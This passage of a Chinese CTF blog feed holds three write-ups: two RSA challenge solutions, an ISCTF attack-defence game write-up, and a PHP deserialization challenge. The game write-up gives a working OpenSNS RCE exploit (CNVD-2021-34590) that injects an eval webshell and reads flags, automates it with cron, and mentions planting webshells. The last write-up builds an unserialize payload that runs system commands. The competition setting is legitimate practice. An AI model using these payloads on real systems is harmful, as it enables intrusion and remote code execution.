class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">s = getPrime(<span class="number">128</span>)</span><br><span class="line">k = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">seek1 = p*s</span><br><span class="line">seek2 = q*k</span><br><span class="line">seek3 = s*k</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(seek1)</span><br><span class="line"><span class="built_in">print</span>(seek2)</span><br><span class="line"><span class="built_in">print</span>(seek3)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">17034526359906374675222899048129793386473729727961851733668266173715506273934226618903915327347680201386438684211280871430960401386916021458749533875225149368757915582850037170031336862864220965224712317292408675261654733853726119671544885158743864358155418727967683788352892259519172776767011253307992508658787036093010953540438865556151687132667690293590304094069132122821611257522409132491206241878258953750975043892338280574703622715614385904469190033441247428911800257097240824225432194243602777112774675510936575635571170740329720227162079500469956310746873132644419840611848333802207608652869080821316814006039</span></span><br><span class="line"><span class="string">31064534580137722018723185060822560614595271317101024671103834301982025703308358280617670492170754990183711198694392500995348706299728134379707212369534471489902209545060592051514886997951859233729914969365008090709174580598044945031296428531946547802954873288796478626936584991410702713951383782424003825610226728036611739090258953115031673157531</span></span><br><span class="line"><span class="string">24213197274140919663950771475506320265583015671558310318006684746019240494812396672068641326932339831508586851960432536051863105773343184877340119017546817780287117748145293115469964769795237573829418533841547969451268532899237529671580701722254679851009751345719473395857872899046537572034595080443184983155696803469587776652323407147950333716539</span></span><br><span class="line"><span class="string">44155715757886274586781970607943060213741487009882893164192666734219021562031</span></span><br><span class="line"><span class="string">6636871845889289821451339461667353441602430792099749101933216934629214305159040913567522609116395485018234259025910227221402350884391969711051377864656945164699379734982178962637190192088596776288873871651609167259167456816094141938735498585327839045360319836147041837569528592447701501104067430848582239927052031661696213986982946173792468753773505681630323945625892041031455025095934790620541499679023777086690062211807019645557781380979957862910047981754126193036968611612056475750787560328372643151874535031184052794483578557248028165948247504989100884012688908781349748818365779371062209169311607720595792421590</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="0x0201-解题"><a href="#0x0201-解题" class="headerlink" title="0x0201 解题"></a>0x0201 解题</h3><p>从题目所给的三个seek可以首先得出<code>k</code>和<code>s</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = gmpy2.gcd(seek2,seek3)</span><br><span class="line">s = gmpy2.gcd(seek1,seek3)</span><br></pre></td></tr></table></figure><p>再通过<code>seek1</code>和<code>seek2</code>可以得出<code>p</code>和<code>q</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = seek1//s</span><br><span class="line">q = seek2//k</span><br></pre></td></tr></table></figure><p>最后就是常规解法，所以最后解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">17034526359906374675222899048129793386473729727961851733668266173715506273934226618903915327347680201386438684211280871430960401386916021458749533875225149368757915582850037170031336862864220965224712317292408675261654733853726119671544885158743864358155418727967683788352892259519172776767011253307992508658787036093010953540438865556151687132667690293590304094069132122821611257522409132491206241878258953750975043892338280574703622715614385904469190033441247428911800257097240824225432194243602777112774675510936575635571170740329720227162079500469956310746873132644419840611848333802207608652869080821316814006039</span></span><br><span class="line">seek1 = <span class="number">31064534580137722018723185060822560614595271317101024671103834301982025703308358280617670492170754990183711198694392500995348706299728134379707212369534471489902209545060592051514886997951859233729914969365008090709174580598044945031296428531946547802954873288796478626936584991410702713951383782424003825610226728036611739090258953115031673157531</span></span><br><span class="line">seek2 = <span class="number">24213197274140919663950771475506320265583015671558310318006684746019240494812396672068641326932339831508586851960432536051863105773343184877340119017546817780287117748145293115469964769795237573829418533841547969451268532899237529671580701722254679851009751345719473395857872899046537572034595080443184983155696803469587776652323407147950333716539</span></span><br><span class="line">seek3 = <span class="number">44155715757886274586781970607943060213741487009882893164192666734219021562031</span></span><br><span class="line">c = <span class="number">6636871845889289821451339461667353441602430792099749101933216934629214305159040913567522609116395485018234259025910227221402350884391969711051377864656945164699379734982178962637190192088596776288873871651609167259167456816094141938735498585327839045360319836147041837569528592447701501104067430848582239927052031661696213986982946173792468753773505681630323945625892041031455025095934790620541499679023777086690062211807019645557781380979957862910047981754126193036968611612056475750787560328372643151874535031184052794483578557248028165948247504989100884012688908781349748818365779371062209169311607720595792421590</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">k = gmpy2.gcd(seek2,seek3)</span><br><span class="line">s = gmpy2.gcd(seek1,seek3)</span><br><span class="line"><span class="comment"># print(f&quot;k = &#123;k&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;s = &#123;s&#125;&quot;)</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(s) <span class="keyword">and</span> isPrime(k) <span class="keyword">and</span> seek3 == s*k</span><br><span class="line">p = seek1//s</span><br><span class="line">q = seek2//k</span><br><span class="line"><span class="comment"># print(f&quot;p = &#123;p&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;q = &#123;q&#125;&quot;)</span></span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">long_to_bytes(m)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;ISCTF&#123;iiii|||yesyes||7777&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x03-题目：ezRSA"><a href="#0x03-题目：ezRSA" class="headerlink" title="0x03 题目：ezRSA"></a>0x03 题目：ezRSA</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104094507246.png" alt="image-20221104094507246"></p><p>附件📎：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ISCTF&#123;************&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    e = random.randint(<span class="number">100</span>,<span class="number">1000</span>)</span><br><span class="line">    p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">    q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">    phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    t=gmpy2.gcd(e,phi_n)</span><br><span class="line">    <span class="keyword">if</span>  gmpy2.invert(e // t, phi_n) <span class="keyword">and</span> t !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">146061540583135242741006647792481468215928177245453689591382075771990192360040412020479342624228118794110240955451899373848827328177557126556072570082923983968091404980923313006963667391261364191537502509633623502033578910844508808321175673461956149400289968262858691371016246515264343715246136003074155184273</span></span><br><span class="line"><span class="string">106988826778655284666865642844938578070029566283623778317110345394696520999319699165122638213405544697509248818119744714371964212582672270467711234178627339558783803718844973937701655329775612593193896887658613019039808270266901149871250769922857432588126510259997039777751047281603319139760808677732919216899</span></span><br><span class="line"><span class="string">740</span></span><br><span class="line"><span class="string">6282526058961246581872664236584053247822096703448673698014149841099601111078858783085447440545491467659016466697346055841162217815656467685468263870813754625318960798390457353869689600971254126026498299128586642169553158659216998193596000256435504143502966206895545701691216757482393700125791878031903647831939512035110314068235625347074791191183719857770670134500097347113475463330210378392860796906074883251200522628116993249459465350593837432195675595929482809838619649519612607292091411530134831844063986714485104831320923176335931609571205307034732956741442770883207107022828296237748601658720079333177460160664</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="0x0301-解题"><a href="#0x0301-解题" class="headerlink" title="0x0301 解题"></a>0x0301 解题</h3><p>简单分析一下题目中的循环：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    e = random.randint(<span class="number">100</span>,<span class="number">1000</span>) </span><br><span class="line">    p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">    q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">    phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    t=gmpy2.gcd(e,phi_n)</span><br><span class="line">    <span class="keyword">if</span>  gmpy2.invert(e // t, phi_n) <span class="keyword">and</span> t !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得出以下结论：</p><blockquote><ol><li>$e$不一定为素数</li><li>$e$和$\phi$一定不互素</li><li>$e$和$\phi$的最大公因数为<code>t</code>，且<code>t</code>可以直接求出来</li></ol></blockquote><p>由RSA公式可知$e$和$\phi$需要互为素数才可以求出$d$，所以需要先求出<code>t</code>进行计算<br>只是最后得出的$m$需要对<code>t</code>进行开方<br>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">146061540583135242741006647792481468215928177245453689591382075771990192360040412020479342624228118794110240955451899373848827328177557126556072570082923983968091404980923313006963667391261364191537502509633623502033578910844508808321175673461956149400289968262858691371016246515264343715246136003074155184273</span></span><br><span class="line">q = <span class="number">106988826778655284666865642844938578070029566283623778317110345394696520999319699165122638213405544697509248818119744714371964212582672270467711234178627339558783803718844973937701655329775612593193896887658613019039808270266901149871250769922857432588126510259997039777751047281603319139760808677732919216899</span></span><br><span class="line">e = <span class="number">740</span></span><br><span class="line">c = <span class="number">6282526058961246581872664236584053247822096703448673698014149841099601111078858783085447440545491467659016466697346055841162217815656467685468263870813754625318960798390457353869689600971254126026498299128586642169553158659216998193596000256435504143502966206895545701691216757482393700125791878031903647831939512035110314068235625347074791191183719857770670134500097347113475463330210378392860796906074883251200522628116993249459465350593837432195675595929482809838619649519612607292091411530134831844063986714485104831320923176335931609571205307034732956741442770883207107022828296237748601658720079333177460160664</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n = p*q</span><br><span class="line">t = gmpy2.gcd(e,phi)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;t = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e//t,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">plaintext = gmpy2.iroot(m, t)[<span class="number">0</span>]</span><br><span class="line">plaintext = long_to_bytes(plaintext)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = 4</span><br><span class="line">b&#x27;ISCTF&#123;1dedc976-d253-4053-b2f5-557282f41fc5&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次ISCTF新生赛的AWD</title>
      <link href="/2022/11/04/1fc5167b9242-q1jun/"/>
      <url>/2022/11/04/1fc5167b9242-q1jun/</url>
      
        <content type="html"><![CDATA[<p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104084714225.png" alt="image-20221104084714225"></p><p>最终得分111913，因为不太会pwn，所以只能靠web得分了呜呜</p><h2 id="0x01-拿到自己的Box"><a href="#0x01-拿到自己的Box" class="headerlink" title="0x01 拿到自己的Box"></a>0x01 拿到自己的Box</h2><p>拿到自己的box之后，第一时间把源码下载下来：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085116310.png" alt="image-20221104085116310"></p><p>站点为：<strong>OPENSNS V6.2</strong></p><p>审计一下代码</p><blockquote><p> 因为出门只有mac没有win不能直接用D盾扫，只好手动审计一下了</p></blockquote><p>在 <strong>.config.php</strong>上发现了一个不死马，<del>最后知道这是三哈传的</del></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085356624.png" alt="image-20221104085356624"></p><p>还有一个一句话木马：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104085441370.png" alt="image-20221104085441370"></p><p>这个一句话木马直接删除就好。</p><p>不死马的话直接修改<code>.htaccess</code>文件，添加一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">    ······</span><br><span class="line">    #修复不死马</span><br><span class="line">    RewriteRule (.*).config.php$                     - [F]</span><br><span class="line">    ······</span><br></pre></td></tr></table></figure><p>再次访问，就可以看到 这个不死马已经是403了。</p><h2 id="0x02-RCE修复"><a href="#0x02-RCE修复" class="headerlink" title="0x02 RCE修复"></a>0x02 RCE修复</h2><p><strong>CNVD-2021-34590</strong>，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122215945">Opensns 命令执行漏洞（CNVD-2021-34590)</a></p><p>漏洞代码位于 <strong>&#x2F;app&#x2F;Application&#x2F;Weibo&#x2F;Model&#x2F;ShareModel.class.php</strong></p><p>（比赛懒得修，直接修改文件后缀就好了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /app/Application/Weibo/Model/ShareModel.class.php /app/Application/Weibo/Model/ShareModel.class.php.bak</span><br></pre></td></tr></table></figure><h2 id="0x03-攻击其他靶机"><a href="#0x03-攻击其他靶机" class="headerlink" title="0x03 攻击其他靶机"></a>0x03 攻击其他靶机</h2><p>知道了<strong>CNVD-2021-34590</strong>的利用方式，通过该<code>rce</code>可以编辑一个脚本进行自动获得flag，并提交：</p><blockquote><p>因为打比赛的时间都在上课，所以脚本也是仓促写的，能用就行（看不懂别骂我</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">9</span>: <span class="comment">#38009被ban，跳过</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    url1 = <span class="string">&quot;http://120.79.18.34:380&quot;</span>+<span class="string">&quot;%02d&quot;</span>%i+<span class="string">&quot;/http://106.54.23.125/index.php?s=weibo/share/shareBox&amp;query=app=Common%26model=Schedule%26method=runSchedule%26id[method]=-%3E_validationFieldItem%26id[status]=1%26id[4]=function%26id[1]=assert%26id[args]=jiang=@eval($_POST[cmd])%26id[0]=jiang&quot;</span></span><br><span class="line">    passwd=<span class="string">&quot;cmd&quot;</span></span><br><span class="line">    payload=&#123;</span><br><span class="line">        passwd:<span class="string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.post(url1,payload,timeout=<span class="number">1</span>).text</span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;ISCTF.+\&#125;&#x27;</span>)</span><br><span class="line">    result=pattern.findall(response)</span><br><span class="line">    <span class="comment"># upurl = &quot;http://120.79.18.34:19999/api/flag&quot;</span></span><br><span class="line">    <span class="comment"># header = &#123;</span></span><br><span class="line">    <span class="comment">#     &#x27;Authorization&#x27;: &#x27;换成你的&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    flag = <span class="built_in">str</span>(result).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    a=os.system(<span class="string">&quot;curl -X POST http://120.79.18.34:19999/api/flag -H &#x27;Authorization: 换成你的&#x27; -d &#x27;&#123; \&quot;flag\&quot;: \&quot;&quot;</span>+flag+<span class="string">&quot;\&quot; &#125;&#x27;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;http://120.79.18.34:380&quot;</span>+<span class="string">&quot;%02d&quot;</span>%i+<span class="string">f&quot;flag提交成功，返回数据：\n<span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前期由于大部分选手都没有修复这个漏洞，所以基本上是可以AK所有Web站点，得分也比较高。</p><p>也可以通过这个漏洞上传自己的小马，进行批量得分，通过上方的脚本修改一下就可以。</p><p>由于比赛是10分钟一轮，可以通过在Linux设置定时执行脚本来自动得分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e #打开cron设置</span><br></pre></td></tr></table></figure><p>输入下面定时设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,11,21,31,41,51 * * * * python3 ~/script.py &gt;&gt; ~/log.log</span><br></pre></td></tr></table></figure><p>表示每小时的1,11,21,31,41,51分钟执行一次该脚本</p><blockquote><p>后面有个老哥在每轮开始就删站，不让其他人得分，导致其他人没有体验。</p><p>我只能通过先前埋的小马拿保底分…</p><p>最后主办方提前结束了比赛，挺没意思的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[UUCTF 2022]ez_user</title>
      <link href="/2022/11/02/ca47008dac60-q1jun/"/>
      <url>/2022/11/02/ca47008dac60-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221102230850974.png" alt="image-20221102230850974"></p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>进入环境，获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">你输入的不正确！！！搞什么！！</span><br></pre></td></tr></table></figure><p>审计源码，为php反序列化</p><p>这里首先想到的是利用<strong>CVE-2016-7124</strong>，后面发现不成功，看了下题目的环境：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221102231137935.png" alt="image-20221102231137935"></p><p>题目为<code>PHP 5.6.28</code>，而该漏洞利用的条件是</p><blockquote><p>PHP5 &lt;5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><p>那只能换一种思路。</p><p>题目中php函数的触发顺序为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>() &gt;&gt; <span class="title function_ invoke__">__wakeup</span>() &gt;&gt; <span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure><p>变量<code>a</code>在wakeup中被置空了，所以在<code>__destruct()</code>中想要执行提前构造好的a，只能利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br></pre></td></tr></table></figure><p>这条语句，也就是将<code>b</code>和<code>a</code>“链接”起来:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;a=&amp;this-&gt;b;</span><br></pre></td></tr></table></figure><p>这样在<code>a</code>被设置为空字符串之后，通过<code>$this-&gt;b=$this-&gt;c;</code>重新赋予我们构造好的命令进行执行。</p><p>构造代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入参数a&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin 